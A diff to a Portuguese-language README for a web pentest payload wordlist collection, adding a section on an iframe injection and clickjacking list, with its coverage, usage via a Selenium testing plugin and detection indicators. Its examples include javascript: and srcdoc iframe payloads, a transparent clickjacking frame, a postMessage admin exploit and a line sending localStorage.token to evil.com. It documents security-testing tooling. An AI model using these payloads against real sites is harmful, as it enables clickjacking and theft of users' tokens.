@@ -247,6 +247,83 @@ JS> fetch('/render', {
 })
 ```
 
+### 9. **iframe.txt** (170+ payloads)
+Iframe Injection e Clickjacking.
+
+**Cobertura:**
+- Basic iframe injection
+- JavaScript protocol handlers
+- Data URI schemes
+- Iframe sandbox bypass
+- Clickjacking vectors
+- UI redressing
+- Framejacking techniques
+- X-Frame-Options bypass
+- PostMessage exploits
+- Storage access via iframe
+- CSS injection in iframe
+- Encoded iframes
+
+**Tipos de Ataque:**
+- **Iframe Injection:** Injeção de iframes maliciosos
+- **Clickjacking:** Sobreposição transparente de frames
+- **UI Redressing:** Manipulação da interface do usuário
+- **Frame-based XSS:** XSS através de iframes
+- **Data Exfiltration:** Roubo de dados via iframes
+- **CORS Bypass:** Contorno de políticas de mesma origem
+
+**Exemplos:**
+```html
+<!-- Basic Injection -->
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+<!-- Clickjacking -->
+<iframe src="https://victim.com" style="opacity:0;position:absolute"></iframe>
+
+<!-- Sandbox Bypass -->
+<iframe sandbox="allow-scripts" src="javascript:alert(1)"></iframe>
+
+<!-- PostMessage Exploit -->
+<iframe src="https://victim.com" onload="this.contentWindow.postMessage({admin:true},'*')"></iframe>
+
+<!-- Data Exfiltration -->
+<iframe srcdoc="<script>fetch('https://evil.com/?data='+localStorage.token)</script>"></iframe>
+```
+
+**Uso:**
+```bash
+# Selenium Interactive - Ctrl+F
+# Testa automaticamente iframe injection e clickjacking
+
+# Manual testing
+python3 plugins/interactive-testing/selenium_interactive/selenium_interactive.py https://target.com
+
+# No browser:
+# 1. Click em input field
+# 2. Pressione Ctrl+F
+# 3. Aguarde testes de iframe injection
+```
+
+**Detecção:**
+- Busca por iframes injetados no HTML
+- Verifica atributos perigosos (javascript:, data:, srcdoc=)
+- Checa presença de X-Frame-Options header
+- Analisa CSP frame-ancestors directive
+- Identifica iframes com event handlers
+- Detecta tentativas de clickjacking
+
+**Indicadores de Vulnerabilidade:**
+```javascript
+// Falta de proteção contra clickjacking
+X-Frame-Options: (ausente)
+Content-Security-Policy: (sem frame-ancestors)
+
+// Iframe injection bem-sucedida
+<iframe src="javascript:alert(1)"></iframe> (presente no HTML)
+```
+
 ## 📊 Estatísticas
 
 | Wordlist | Payloads | Tamanho | Tipos |
@@ -259,8 +336,9 @@ JS> fetch('/render', {
 | rce.txt | 150+ | ~10KB | Linux, Windows, Shells |
 | xxe.txt | 50+ | ~8KB | Basic, Blind, OOB |
 | ssti.txt | 100+ | ~12KB | Multiple engines |
+| iframe.txt | 170+ | ~18KB | Injection, Clickjacking, Bypass |
 
-**Total:** 1,600+ payloads únicos
+**Total:** 1,770+ payloads únicos
 
 ## 🎯 Uso com Plugins
 
@@ -274,6 +352,9 @@ python3 plugins/interactive-testing/selenium_interactive/selenium_interactive.py
 # Ctrl+I = Testa todos os SQLi payloads
 # Ctrl+X = Testa todos os XSS payloads
 # Ctrl+L = Testa todos os LFI payloads
+# Ctrl+F = Testa todos os Iframe Injection payloads
+# Ctrl+C = Testa API via JavaScript console
+# Ctrl+Q = Sair
 ```
 
 ### Selenium Fuzzer
